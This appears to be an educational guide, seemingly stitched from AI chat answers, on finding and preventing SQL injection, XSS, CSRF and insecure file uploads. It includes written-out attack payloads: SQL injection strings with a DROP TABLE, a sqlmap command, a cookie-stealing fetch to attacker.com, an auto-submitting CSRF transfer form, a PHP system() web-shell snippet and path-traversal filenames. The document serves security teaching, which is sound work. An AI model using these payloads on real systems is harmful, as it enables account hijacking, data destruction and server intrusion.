# Common-Vulnerabilities-

Checking a website for vulnerabilities involves identifying potential security weaknesses that could be exploited by attackers. Here’s a step-by-step guide to help you assess website vulnerabilities effectively:

### 1. Understand Common Vulnerabilities
   Familiarize yourself with common web vulnerabilities, such as:
   - **SQL Injection**: Attackers manipulate database queries.
   - **Cross-Site Scripting (XSS)**: Malicious scripts are injected into web pages.
   - **Cross-Site Request Forgery (CSRF)**: Unauthorized actions are performed on behalf of a user.
   - **Insecure File Uploads**: Allowing unsafe files to be uploaded.
   - **Broken Authentication**: Weak login mechanisms.
   - **Security Misconfigurations**: Improperly configured servers or software.

   Resources like the **OWASP Top Ten** (Open Web Application Security Project) provide a great starting point.

### 2. Manual Inspection
   - **Review Code**: If you have access to the website’s source code, look for insecure practices (e.g., unsanitized user inputs, hardcoded credentials).
   - **Test Inputs**: Enter unexpected data (e.g., special characters, long strings) into forms to see how the site handles it.
   - **Check Permissions**: Ensure sensitive pages or files (e.g., admin panels) aren’t publicly accessible.
   - **Inspect Headers**: Use browser developer tools (F12) to check for missing security headers like `Content-Security-Policy`, `X-Frame-Options`, or `Strict-Transport-Security`.

### 3. Use Automated Tools
   Automated scanners can quickly identify vulnerabilities. Some popular options include:
   - **Burp Suite**: A powerful tool for manual and automated testing (requires some setup and learning).
   - **OWASP ZAP**: Free, open-source tool for finding vulnerabilities like XSS and SQL injection.
   - **Nikto**: A lightweight scanner for server misconfigurations and outdated software.
   - **W3af**: Open-source framework for web application security testing.
   - **Nessus**: A broader vulnerability scanner that includes web checks (paid, with a free trial).

   **How to Use**: Input the website URL into the tool, configure the scan (e.g., scope, depth), and review the report for issues.

### 4. Check for Outdated Software
   - **CMS/Frameworks**: If the site uses WordPress, Drupal, or similar, ensure the core, plugins, and themes are updated. Outdated versions often have known exploits.
   - **Server Software**: Verify the web server (e.g., Apache, Nginx) and dependencies (e.g., PHP, Python) are current.
   - **Tools**: Use `WhatWeb` or `Wappalyzer` (browser extension) to identify technologies, then cross-check versions against vulnerability databases like **CVE Details**.

### 5. Test SSL/TLS Security
   - Use **Qualys SSL Labs** (ssllabs.com) to test the site’s HTTPS configuration. It checks for weak ciphers, expired certificates, or misconfigurations.
   - Ensure the site enforces HTTPS and redirects HTTP traffic.

### 6. Leverage Web and X Searches
   - Search for known vulnerabilities in the site’s tech stack (e.g., “WordPress 6.2 vulnerability”).
   - Check X posts or forums for reports of exploits related to the site or its software.

### 7. Hire a Professional (Optional)
   If it’s a critical site, consider a penetration test by a certified ethical hacker. They’ll simulate real attacks to uncover hidden issues.

### Practical Example
   Let’s say you’re testing “example.com”:
   1. Run `https://www.ssllabs.com/ssltest/analyze.html?d=example.com` to check SSL.
   2. Use OWASP ZAP: Enter the URL, start a “Spider” scan to map the site, then run an “Active Scan” to probe for vulnerabilities.
   3. Manually test a login form with `' OR 1=1 --` to check for SQL injection (only on sites you own or have permission to test).

### Important Notes
   - **Permission**: Only test websites you own or have explicit authorization to scan. Unauthorized testing is illegal in many jurisdictions.
   - **False Positives**: Automated tools may flag issues that aren’t exploitable—verify findings manually.
   - **Stay Updated**: New vulnerabilities emerge daily, so repeat checks periodically.

Let me know if you’d like a deeper dive into any specific tool or technique!

---

### What is SQL Injection?
SQL Injection is a type of attack where malicious SQL code is inserted into a query via user input (e.g., forms, URL parameters). If the application doesn’t properly validate or sanitize this input, the attacker can alter the query’s logic, potentially gaining unauthorized access to data, modifying it, or even taking control of the system.

For example, a login form might expect a username and password, but an attacker could input something like `' OR '1'='1` to bypass authentication.

---

### How Does SQL Injection Work?
Most web applications use SQL databases (e.g., MySQL, PostgreSQL, SQLite) to store and retrieve data. Developers often build SQL queries dynamically using user input. If this input isn’t handled securely, attackers can exploit it.

#### Example Scenario
Imagine a login system with this SQL query:
```sql
SELECT * FROM users WHERE username = 'user' AND password = 'pass';
```
The application takes user input for `username` and `password` and inserts it directly into the query. Now, an attacker enters:
- Username: `' OR '1'='1`
- Password: `anything`

The resulting query becomes:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'anything';
```
Since `'1'='1'` is always true, the query returns the first user in the database (often an admin), bypassing the password check.

#### Types of SQL Injection
1. **Classic SQL Injection**: Directly manipulates queries via input fields (as above).
2. **Blind SQL Injection**: The attacker infers results based on application behavior (e.g., true/false responses) when direct output isn’t visible.
3. **Time-Based SQL Injection**: Uses delays (e.g., `SLEEP(5)`) to deduce database responses.
4. **Union-Based SQL Injection**: Combines malicious queries with legitimate ones using `UNION` to extract additional data.
5. **Out-of-Band SQL Injection**: Exploits external channels (e.g., DNS requests) to exfiltrate data.

---

### Impact of SQL Injection
The consequences depend on the system’s setup but can include:
- **Data Exposure**: Access to sensitive information (e.g., usernames, passwords, credit card details).
- **Data Manipulation**: Altering or deleting records (e.g., changing account balances).
- **Authentication Bypass**: Logging in as any user without credentials.
- **System Compromise**: In severe cases, executing system commands via database functions (e.g., `xp_cmdshell` in SQL Server).
- **Legal/Reputation Damage**: Breaches can lead to fines, lawsuits, or loss of trust.

A famous real-world example is the 2008 **Heartland Payment Systems breach**, where SQL injection exposed 130 million credit card records.

---

### How Attackers Find SQL Injection Points
- **Manual Testing**: Entering special characters (e.g., `'`, `--`, `;`) into forms or URLs and observing errors or unexpected behavior.
- **Automated Tools**: Tools like **SQLMap** scan for injectable parameters and automate exploitation.
- **Error Messages**: Misconfigured sites may leak database details (e.g., “MySQL error: syntax near…”), guiding attackers.

---

### Prevention Techniques
To protect against SQL Injection, developers and administrators can implement these best practices:

1. **Use Prepared Statements/Parameterized Queries**
   - Instead of concatenating user input into queries, use placeholders. Example in PHP:
     ```php
     $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
     $stmt->execute([$username, $password]);
     ```
   - This ensures input is treated as data, not executable code.

2. **Input Validation and Sanitization**
   - Reject unexpected characters (e.g., quotes, semicolons) or restrict input to specific formats (e.g., alphanumeric only).
   - Use libraries like PHP’s `filter_var()` or frameworks with built-in sanitization.

3. **Escape Special Characters**
   - If parameterized queries aren’t an option, escape input (e.g., MySQL’s `mysql_real_escape_string()`), though this is less secure.

4. **Use an ORM**
   - Object-Relational Mappers (e.g., Hibernate, Django ORM) abstract SQL queries, reducing injection risks.

5. **Least Privilege Principle**
   - Run the database with minimal permissions. For example, a web app shouldn’t use a root account that can drop tables.

6. **Web Application Firewall (WAF)**
   - Deploy a WAF (e.g., Cloudflare, ModSecurity) to detect and block malicious SQL patterns.

7. **Error Handling**
   - Suppress detailed error messages (e.g., database stack traces) and show generic responses to users.

---

### Testing for SQL Injection
If you’re assessing your own site (with permission):
- **Manual Test**: Try inputs like `'`, `1; DROP TABLE users --`, or `' OR '1'='1` in forms or URLs.
- **SQLMap**: Run `sqlmap -u "http://example.com/login.php" --data="username=admin&password=test"` to automate detection and exploitation.
- **Check Logs**: Look for anomalies after testing (e.g., unusual queries).

---

### Fun Fact
SQL Injection has been around since the late 1990s and remains a top threat because of lazy coding practices. The XKCD comic “Exploits of a Mom” famously illustrates it with “Robert'); DROP TABLE Students; --” (aka “Little Bobby Tables”).

Let me know if you’d like a demo of a specific technique or more examples!

Absolutely! Cross-Site Scripting (XSS) is another prevalent web vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. Here’s a detailed breakdown of what it is, how it works, its impact, and how to prevent it.

---

### What is Cross-Site Scripting (XSS)?
XSS occurs when an attacker exploits a web application’s failure to properly sanitize or escape user input, enabling them to inject malicious code (usually JavaScript) into a webpage. This code executes in the victim’s browser, potentially stealing data, hijacking sessions, or defacing the site.

Unlike SQL Injection, which targets the server’s database, XSS targets the client-side (the user’s browser).

---

### How Does XSS Work?
Web applications often display user-provided data (e.g., comments, usernames, search results). If this data isn’t sanitized, attackers can embed scripts that run when the page loads.

#### Example Scenario
Suppose a website has a comment section. A user submits this comment:
```html
<script>alert('Hacked!');</script>
```
If the site doesn’t filter or escape the input and displays it raw, every visitor’s browser will execute the script, popping up an “Hacked!” alert.

#### Types of XSS
1. **Reflected (Non-Persistent) XSS**
   - The malicious script is part of the request (e.g., a URL parameter) and reflected back in the response.
   - Example: `http://example.com/search?q=<script>alert('XSS')</script>`
   - Common in phishing attacks where victims are tricked into clicking a crafted link.

2. **Stored (Persistent) XSS**
   - The script is stored on the server (e.g., in a database) and served to all users who view the affected page.
   - Example: A malicious script in a forum post that runs for every visitor.
   - More dangerous due to its wider reach.

3. **DOM-Based XSS**
   - The vulnerability lies in client-side JavaScript that manipulates the Document Object Model (DOM) unsafely.
   - Example: A script takes URL input (e.g., `document.write(location.hash)`) and executes it without validation.
   - Harder to detect since it doesn’t involve server interaction.

---

### Impact of XSS
The damage depends on the attacker’s goals, but XSS can lead to:
- **Session Hijacking**: Stealing cookies with `document.cookie` to impersonate users.
- **Data Theft**: Capturing keystrokes or form data (e.g., credit card numbers).
- **Malware Distribution**: Redirecting users to malicious sites or downloading files.
- **Defacement**: Altering webpage content (e.g., replacing text with “You’ve been hacked”).
- **Phishing**: Displaying fake login prompts to steal credentials.

A notable real-world case is the 2005 **MySpace worm** (Samy worm), where XSS spread a script across profiles, adding “Samy is my hero” to millions of pages in hours.

---

### How Attackers Find XSS Vulnerabilities
- **Manual Testing**: Injecting payloads like `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`, or `"><script>alert(1)</script>` into forms, URLs, or headers.
- **Automated Tools**: Tools like **Burp Suite**, **XSStrike**, or **OWASP ZAP** scan for XSS by submitting payloads and checking responses.
- **Browser Inspection**: Checking if input is reflected in the HTML, JavaScript, or attributes without proper encoding.

---

### Common XSS Payloads
Attackers use various payloads depending on context:
- Basic: `<script>alert('XSS')</script>`
- Image Tag: `<img src="invalid" onerror="alert('XSS')">`
- Event Handler: `<div onmouseover="alert('XSS')">Hover me!</div>`
- URL Encoded (for filters): `%3Cscript%3Ealert(1)%3C/script%3E`
- Advanced: `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`

Filters may block `<script>`, so attackers get creative with tags like `<iframe>`, `<svg>`, or even CSS (`expression()` in older browsers).

---

### Prevention Techniques
To mitigate XSS, developers should focus on secure coding and configuration:

1. **Escape Output**
   - Encode user input before displaying it:
     - HTML: Convert `<` to `&lt;`, `>` to `&gt;`, etc.
     - JavaScript: Escape quotes and special characters (e.g., use `\` or libraries like `encodeURIComponent`).
     - Attributes: Avoid dynamic attributes; encode values.
   - Use libraries like PHP’s `htmlspecialchars()` or JavaScript’s `DOMPurify`.

2. **Content Security Policy (CSP)**
   - Add a CSP header to restrict script sources:
     ```http
     Content-Security-Policy: script-src 'self';
     ```
   - This blocks inline scripts and external sources unless explicitly allowed.

3. **Input Validation**
   - Restrict input to expected formats (e.g., alphanumeric usernames, no `<` or `>`).
   - Use whitelisting (allow only safe characters) over blacklisting.

4. **Avoid Dangerous Practices**
   - Don’t use `eval()`, `innerHTML`, or `document.write()` with untrusted data.
   - Example fix: Replace `element.innerHTML = userInput` with `element.textContent = userInput`.

5. **Secure Cookies**
   - Set the `HttpOnly` flag on cookies (`Set-Cookie: session=xyz; HttpOnly`) to prevent access via JavaScript.
   - Use `Secure` and `SameSite` flags to limit exposure.

6. **Use Frameworks**
   - Modern frameworks (e.g., React, Angular, Vue) often escape output by default, reducing XSS risk.

7. **Web Application Firewall (WAF)**
   - Deploy a WAF to filter malicious payloads (e.g., Cloudflare, ModSecurity).

---

### Testing for XSS
If you’re testing your own site (with permission):
- **Manual Test**: Submit `<script>alert(1)</script>` in forms, URL parameters, or search bars and check if it executes.
- **Burp Suite**: Intercept requests, inject payloads, and monitor responses.
- **Browser Console**: Inspect the DOM to see if input is reflected unsafely.

---

### Fun Fact
XSS got its name because it “crosses” from server-side data to client-side execution. It’s been a top vulnerability since the early 2000s, yet it persists due to sloppy input handling.

Let me know if you want a deeper dive into a specific type, payload, or prevention method!
Here’s a detailed explanation of Cross-Site Request Forgery (CSRF), another critical web vulnerability. I’ll cover what it is, how it works, its impact, and how to prevent it.

---

### What is Cross-Site Request Forgery (CSRF)?
CSRF (often pronounced "sea-surf") is an attack that tricks a user’s browser into performing unintended actions on a trusted website where the user is authenticated. It exploits the trust that a site has in the user’s browser by sending forged requests, typically without the user’s knowledge.

Unlike XSS, which injects scripts into a page, CSRF leverages the browser’s ability to send authenticated requests (e.g., via cookies) to a target site.

---

### How Does CSRF Work?
Web applications often use cookies to maintain user sessions. Once logged in, the browser automatically includes these cookies with every request to the site. CSRF exploits this by tricking the browser into sending a malicious request to the target site.

#### Example Scenario
1. A user logs into their bank account at `bank.com`, and the browser stores an authentication cookie.
2. While still logged in, the user visits a malicious site (e.g., `evil.com`).
3. `evil.com` contains hidden code, like this:
   ```html
   <img src="http://bank.com/transfer?amount=1000&to=attacker">
   ```
4. The browser, seeing the `<img>` tag, sends a GET request to `bank.com` with the user’s cookie attached.
5. If `bank.com` doesn’t verify the request’s origin, it processes the transfer, sending $1,000 to the attacker.

The user doesn’t need to see the image or interact—merely loading the page triggers the request.

#### Key Conditions for CSRF
- The user must be authenticated to the target site (e.g., logged in).
- The site relies on cookies or other automatic authentication tokens.
- The site doesn’t validate the request’s legitimacy (e.g., via tokens or origin checks).

#### Common Attack Vectors
- **GET Requests**: Hidden in `<img>`, `<script>`, or `<iframe>` tags.
- **POST Requests**: Submitted via a hidden form with auto-submitting JavaScript:
  ```html
  <form action="http://bank.com/transfer" method="POST" id="csrfForm">
      <input type="hidden" name="amount" value="1000">
      <input type="hidden" name="to" value="attacker">
  </form>
  <script>document.getElementById("csrfForm").submit();</script>
  ```
- **Social Engineering**: Links in emails or forums tricking users into visiting a malicious page.

---

### Impact of CSRF
The consequences depend on the target site’s functionality but can include:
- **Unauthorized Actions**: Transferring funds, changing passwords, or deleting accounts.
- **Data Modification**: Updating user settings or posting content (e.g., a CSRF attack on a forum could post spam).
- **Financial Loss**: As in the bank example, moving money to an attacker’s account.
- **Reputation Damage**: Compromised accounts can erode trust in the site.

A notable case is the 2008 **uTorrent CSRF vulnerability**, where attackers could remotely execute commands on a user’s system via a web interface.

---

### How Attackers Find CSRF Vulnerabilities
- **Manual Testing**: Crafting requests (e.g., via browser dev tools or `curl`) to see if actions execute without extra validation.
- **Automated Tools**: Tools like **Burp Suite** or **CSRF Tester** simulate requests and check for missing protections.
- **Observation**: Identifying state-changing endpoints (e.g., `/update-profile`, `/transfer-funds`) that rely solely on cookies.

---

### Prevention Techniques
To defend against CSRF, developers must ensure requests are intentional and authorized. Here’s how:

1. **CSRF Tokens**
   - Include a unique, unpredictable token in every state-changing request (e.g., forms, AJAX calls).
   - Example in HTML:
     ```html
     <form action="/transfer" method="POST">
         <input type="hidden" name="csrf_token" value="random123">
         <input type="text" name="amount">
         <input type="submit">
     </form>
     ```
   - The server generates the token, stores it in the user’s session, and verifies it on submission. Attackers can’t guess it.

2. **SameSite Cookie Attribute**
   - Set cookies with `SameSite` to limit when they’re sent:
     - `SameSite=Strict`: Cookies only sent for requests from the same site.
     - `SameSite=Lax`: Allows some cross-site usage (e.g., top-level navigation) but blocks most CSRF vectors.
     - Example: `Set-Cookie: session=xyz; SameSite=Strict`
   - Supported by modern browsers (Chrome, Firefox, etc.).

3. **Check Referer/Origin Headers**
   - Validate the `Referer` or `Origin` HTTP header to ensure requests come from the trusted domain.
   - Example: Reject requests if `Origin` isn’t `https://bank.com`.
   - Note: These can be spoofed or missing in some cases, so they’re less reliable alone.

4. **Require User Interaction**
   - Add a CAPTCHA, password re-entry, or confirmation step for sensitive actions.
   - Example: “Enter your password again to confirm this transfer.”

5. **Avoid GET for State Changes**
   - Use POST, PUT, or DELETE for actions that modify data, as GET requests are easier to forge via tags like `<img>`.

6. **Custom Headers**
   - Require a custom header (e.g., `X-CSRF-Token`) in AJAX requests. Browsers block cross-site scripts from setting custom headers.

7. **Logout After Sensitive Actions**
   - Expire sessions after critical operations to limit the window for CSRF.

---

### Testing for CSRF
If you’re testing your own site (with permission):
- **Manual Test**: Log in, then craft a request (e.g., via `<img>` or a form) to a state-changing endpoint and see if it succeeds without a token.
- **Burp Suite**: Replay authenticated requests without tokens or with altered headers.
- **Check Cookies**: Inspect if `SameSite` is set using browser dev tools.

---

### Fun Fact
CSRF was first widely documented in 2001 by Peter Watkins on the Bugtraq mailing list. It’s sometimes called a “one-click attack” because it can exploit a single unwitting action, like loading a malicious page.

Let me know if you’d like examples, a deeper dive into a specific defense, or help testing for CSRF!
Here’s a detailed rundown on **Insecure File Uploads**, a vulnerability that arises when a web application allows users to upload files without proper validation or restrictions. I’ll explain what it is, how it works, its impact, and how to prevent it.

---

### What are Insecure File Uploads?
Insecure File Uploads occur when a web application permits users to upload files (e.g., images, documents) but fails to adequately validate, restrict, or sanitize them. This can allow attackers to upload malicious files—such as scripts, executables, or backdoors—that the server or users might execute, leading to serious security breaches.

This vulnerability often stems from trusting user input too much or misconfiguring file-handling mechanisms.

---

### How Do Insecure File Uploads Work?
Web applications commonly offer file upload features (e.g., profile pictures, resumes, attachments). If the system doesn’t enforce strict controls, attackers can exploit it by uploading harmful files.

#### Example Scenario
1. A site allows users to upload profile pictures but only checks the file extension (e.g., `.jpg`).
2. An attacker uploads a file named `malware.php.jpg` containing PHP code:
   ```php
   <?php system("whoami"); ?>
   ```
3. The server accepts it because of the `.jpg` extension, but if it’s stored in an executable directory (e.g., `/uploads/`), the attacker can access it via `http://site.com/uploads/malware.php.jpg`.
4. If the server interprets `.php` files, it executes the code, revealing the system user (or worse).

#### Common Exploitation Techniques
- **Executable Scripts**: Upload `.php`, `.asp`, or `.jsp` files disguised as harmless types (e.g., `image.php.jpg`).
- **Malware**: Upload executables (e.g., `.exe`) that trick users or misconfigured servers into running them.
- **Path Traversal**: Use filenames like `../../etc/passwd` to overwrite critical system files.
- **MIME Type Spoofing**: Fake the `Content-Type` header (e.g., `image/jpeg`) while uploading a script.
- **Double Extensions**: Exploit servers that mishandle files like `script.php;.jpg`.

---

### Impact of Insecure File Uploads
The consequences depend on the system and attack, but they can include:
- **Remote Code Execution (RCE)**: Running arbitrary commands on the server (e.g., installing a backdoor).
- **Server Takeover**: Gaining full control if the uploaded file escalates privileges.
- **Data Exposure**: Overwriting or accessing sensitive files (e.g., configuration files with database credentials).
- **Malware Distribution**: Hosting malicious files for other users to download.
- **Denial of Service (DoS)**: Uploading large files to exhaust storage or crash the server.

A real-world example is the 2017 **Equifax breach**, where attackers exploited a related vulnerability (though not directly file uploads) to upload malicious code, exposing data of 147 million people.

---

### How Attackers Find Insecure File Uploads
- **Manual Testing**: Upload files with dangerous extensions (`.php`, `.exe`) or altered headers and check if they’re accepted/executed.
- **Burp Suite**: Intercept upload requests, modify filenames or content, and observe server responses.
- **Fuzzing**: Try various file types, sizes, and names (e.g., `test.php%00.jpg`) to bypass filters.
- **Directory Browsing**: Look for uploaded files in predictable locations (e.g., `/uploads/`).

---

### Prevention Techniques
To secure file uploads, implement strict controls at every step:

1. **Validate File Types**
   - Check the file’s **MIME type** (e.g., `image/jpeg`) using server-side tools, not just extensions.
   - Example in PHP:
     ```php
     $finfo = finfo_open(FILEINFO_MIME_TYPE);
     $mime = finfo_file($finfo, $_FILES['upload']['tmp_name']);
     if (!in_array($mime, ['image/jpeg', 'image/png'])) {
         die("Invalid file type");
     }
     ```

2. **Restrict Extensions**
   - Use a whitelist of allowed extensions (e.g., `.jpg`, `.png`, `.pdf`) and reject all others.
   - Avoid relying solely on extensions—combine with MIME checks.

3. **Sanitize Filenames**
   - Strip special characters (e.g., `../`, `;`, `%00`) and enforce a standard naming convention.
   - Example: Rename uploads to a random string (e.g., `upload_12345.jpg`).

4. **Store Files Outside Web Root**
   - Save uploads in a non-executable directory (e.g., `/var/uploads/`) inaccessible via URL, then serve them via a script.
   - Example: Use a PHP script to read and output files instead of direct access.

5. **Disable Execution**
   - Configure the server to disable script execution in upload directories:
     - Apache: Add `php_flag engine off` in `.htaccess`.
     - Nginx: Restrict `.php` execution with location rules.

6. **Limit File Size**
   - Set a maximum upload size (e.g., 2MB) to prevent DoS:
     - PHP: `upload_max_filesize = 2M` in `php.ini`.

7. **Scan Uploads**
   - Use antivirus software (e.g., ClamAV) to scan files for malware before processing.

8. **Content Validation**
   - For images, verify they’re valid by opening them (e.g., `imagecreatefromjpeg()` in PHP) to catch disguised scripts.
   - For other files, parse and validate structure (e.g., PDF headers).

9. **Use Secure Permissions**
   - Set uploaded files to non-executable permissions (e.g., `chmod 644`) and assign a low-privilege owner.

---

### Testing for Insecure File Uploads
If you’re testing your own site (with permission):
- **Manual Test**: Upload a `.php` file with `<?php echo "test"; ?>` and visit its URL to see if it executes.
- **Burp Suite**: Modify upload requests (e.g., change `Content-Type` to `image/png` for a `.exe`).
- **Fuzzing**: Try extensions like `.php3`, `.phtml`, or null bytes (e.g., `file.php%00.jpg`).
- **Check Storage**: Look for uploaded files in `/uploads/` or similar directories.

---

### Fun Fact
Insecure file uploads often pair with other vulnerabilities (e.g., Local File Inclusion) to devastating effect. A classic trick is uploading a file named `.htaccess` to override server settings!

Let me know if you’d like a specific example, code snippet, or help testing this vulnerability!

